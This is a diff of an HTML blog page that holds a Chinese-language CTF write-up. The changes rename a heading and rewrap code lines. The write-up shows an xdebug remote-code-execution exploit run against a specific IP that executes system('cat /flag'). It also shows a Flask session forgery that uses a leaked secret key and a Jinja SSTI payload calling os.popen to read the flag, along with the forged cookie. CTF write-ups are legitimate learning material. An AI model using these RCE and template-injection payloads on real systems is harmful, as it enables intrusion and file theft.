@@ -152,7 +152,7 @@
 
         <div id="main" >
             <div class ="post_page_title_img" style="height: 25rem;background-image: url(https://s1.ax1x.com/2020/07/16/Urudv4.png);background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
-                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >easy_python</h2></a>
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >xjpc-wp</h2></a>
             </div>
             <!-- Post -->
             <div class="typo" style="padding: 3rem;">
@@ -186,7 +186,7 @@
 <li>直接利用exp打：<code>python3 exp.py -t http://39.106.193.188:12001/ -c &quot;system(&#39;cat /flag&#39;);&quot;</code></li>
 <li>我这里利用脚本死活不对，吐了。</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@iZ2ze6zwjffnai8rtmfwe2Z xdebug-rce]# python3 exp.py -t http:&#x2F;&#x2F;39.106.193.188:12001&#x2F; -c &quot;system(&#39;cat &#x2F;flag&#39;);&quot;</span><br><span class="line">[+] Recieve data: &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;iso-8859-1&quot;?&gt;</span><br><span class="line">&lt;response xmlns&#x3D;&quot;urn:debugger_protocol_v1&quot; xmlns:xdebug&#x3D;&quot;http:&#x2F;&#x2F;xdebug.org&#x2F;dbgp&#x2F;xdebug&quot; command&#x3D;&quot;eval&quot; transaction_id&#x3D;&quot;1&quot;&gt;&lt;property type&#x3D;&quot;string&quot; size&#x3D;&quot;20&quot; encoding&#x3D;&quot;base64&quot;&gt;&lt;![CDATA[ZmxhZ3t1X3JfcWlmZWlfd3VodX0&#x3D;]]&gt;&lt;&#x2F;property&gt;&lt;&#x2F;response&gt;</span><br><span class="line">[+] Result: flag&#123;u_r_qifei_wuhu&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@iZ2ze6zwjffnai8rtmfwe2Z xdebug-rce]# python3 exp.py -t http:&#x2F;&#x2F;39.106.193.188:12001&#x2F; -c &quot;system(&#39;cat &#x2F;flag&#39;);&quot;</span><br><span class="line">[+] Recieve data: &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;iso-8859-1&quot;?&gt;</span><br><span class="line">&lt;response xmlns&#x3D;&quot;urn:debugger_protocol_v1&quot; xmlns:xdebug&#x3D;&quot;http:&#x2F;&#x2F;xdebug.org&#x2F;dbgp&#x2F;xdebug&quot;</span><br><span class="line">command&#x3D;&quot;eval&quot; transaction_id&#x3D;&quot;1&quot;&gt;&lt;property type&#x3D;&quot;string&quot; size&#x3D;&quot;20&quot; encoding&#x3D;&quot;base64&quot;&gt;&lt;!</span><br><span class="line">[CDATA[ZmxhZ3t1X3JfcWlmZWlfd3VodX0&#x3D;]]&gt;&lt;&#x2F;property&gt;&lt;&#x2F;response&gt;</span><br><span class="line">[+] Result: flag&#123;u_r_qifei_wuhu&#125;</span><br></pre></td></tr></table></figure>
 
 <h2 id="easy-python"><a href="#easy-python" class="headerlink" title="easy_python"></a>easy_python</h2><p>这个也直接贴了，脚本也是死活用不对</p>
 <ul>
@@ -217,7 +217,7 @@
 <li><p><a href="https://gitee.com/legoc/flask-session-cookie-manager?_from=gitee_search" target="_blank" rel="noopener">脚本链接</a></p>
 </li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s &#39;soez_tokena7ton7839hfa4hbv9fyq0unb9bas800whv80e&#39; -t &#39;&#123;&quot;name&quot;:&quot;&#123;&#123; config.__class__.__init__.__globals__[\&quot;os\&quot;].popen(\&quot;cat \&#x2F;flag\&quot;).read() &#125;&#125;&quot;&#125;&#39;</span><br><span class="line">.eJwdyDEKwCAMAMCvSCZd7N6vNCWkVkWwUaqb-PdKt-MGCD8edhhDuSIhRUvkMrdGtJQk9R8xl4vzygOhNITT1lK9aATHXSFuIXNEMPb1fGuj5oT5Ae0lH9U.XxF_pA.EK4n3G7n8FGz_Uz2Hf0tUF7eCME</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s &#39;soez_tokena7ton7839hfa4hbv9fyq0unb9bas800whv80e&#39; -t &#39;&#123;&quot;name&quot;:&quot;&#123;&#123; config.__class__.__init__.__globals__[\&quot;os\&quot;].popen(\&quot;cat \&#x2F;flag\&quot;).read() &#125;&#125;&quot;&#125;&#39;</span><br><span class="line">.eJwdyDEKwCAMAMCvSCZd7N6vNCWkVkWwUaqb-PdKt-MGCD8edhhDuSIhRUvkMrdGtJQk9R8xl4vzygOhNITT1lK9aATHXSFuIXNEMPb1fGuj5oT5Ae0lH9U.XxF_pA.EK4</span><br><span class="line">n3G7n8FGz_Uz2Hf0tUF7eCME</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>伪造session即可读取flag~</li>
